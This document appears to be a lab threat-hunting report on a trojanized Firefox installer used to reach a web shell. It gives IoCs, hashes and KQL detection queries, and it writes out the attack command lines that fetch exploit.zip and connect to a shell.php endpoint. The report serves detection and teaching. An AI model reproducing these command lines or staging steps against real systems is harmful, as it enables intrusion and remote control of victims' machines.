# Threat Event (Firefox Used as a Web Shell Relay)
**Detection of Unauthorized Firefox Installation and Malicious Activity on Workstation: snet**

## Steps the "Bad Actor" took Create Logs and IoCs:

1. Initial Compromise: Downloaded a trojanized Firefox installer disguised as a legitimate file (`Firefox Installer.exe`) to `C:\Users\employee0\Downloads\` at 04:29:57 UTC from what appeared to be Mozilla's official CDN.

2. First Malicious Execution: Executed  `setup-stub.exe ` (SHA256: `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac `)
   `  setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://[192.168.1.100]/exploit.zip `

3. **Web Shell Connection Established**: Re-executed `setup-stub.exe` targeting a web shell endpoint for command-and-control:
    `setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://[192.168.1.100]/admin/shell.php`
   
4. Multi-Stage Dropper Deployment: Three sequential download.exe executions occurred from randomized temporary directories, indicating a staged infection process:
- `C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\download.exe` (05:11:57 UTC)
- `C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\download.exe` (05:54:48 UTC - SHA256: `b5284b0e4a5f867a1342a4bc5a7ca21b9c13c49bea1b48624b691473d14dec78`)
- `C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\download.exe` (05:55:31 UTC)
Each executed with: `/LaunchedFromStub /INI=[temp_path]\config.ini`

5. Anti-Forensics: Deleted legitimate `firefox.exe` from `C:\Program Files\Mozilla Firefox\` at 05:55:24 UTC to remove evidence and potentially replace with compromised binary. Deletion initiated by the malicious stub process.

6. Persistence Establishment: Created malicious profile directory  `Temp\MalProfile ` to maintain persistent connection to remote command server and host additional payloads.
---

## Tables Used to Detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table|
| **Purpose**| Used to detect Firefox installer downloads, temporary profile creation, and file deletion (covering tracks). |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect ```download.exe```, ```setup-stub.exe```, and malicious command-line arguments used to install and execute payloads.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to detect external web connections initiated by Firefox and setup-stub to remote IPs (e.g., 172.203.80.23).|

---

## Related Queries:
```kql
// 1. Identify Firefox installer downloads and suspicious file activity
DeviceFileEvents
| where DeviceName == "snet"
| where FileName contains "firefox" 
| where InitiatingProcessAccountName == "employee0"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessCommandLine
| order by Timestamp desc

// 2. Detect malicious process executions (setup-stub.exe and download.exe)
DeviceProcessEvents
| where DeviceName == "snet"
| where FileName in~ ("setup-stub.exe", "download.exe")
| where AccountName == "employee0"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc

// 3. Detect firefox.exe deletion (anti-forensics activity)
DeviceFileEvents
| where DeviceName == "snet"
| where FileName == "firefox.exe"
| where ActionType == "FileDeleted"
| where FolderPath contains "Mozilla Firefox"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, SHA256

// 4. Detect network connections to malicious endpoints
DeviceNetworkEvents
| where DeviceName == "snet"
| where InitiatingProcessFileName in~ ("setup-stub.exe", "firefox.exe")
| where RemoteUrl has_any ("shell.php", "exploit.zip") 
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
```

---

## Created By:
- **Author Name**: Antonio Francisco
- **Author Contact**: https://www.linkedin.com/in/antoniofrancisco-085948210/
- **Date**: October 10, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `October 10, 2025`  | `Antonio Francisco`   
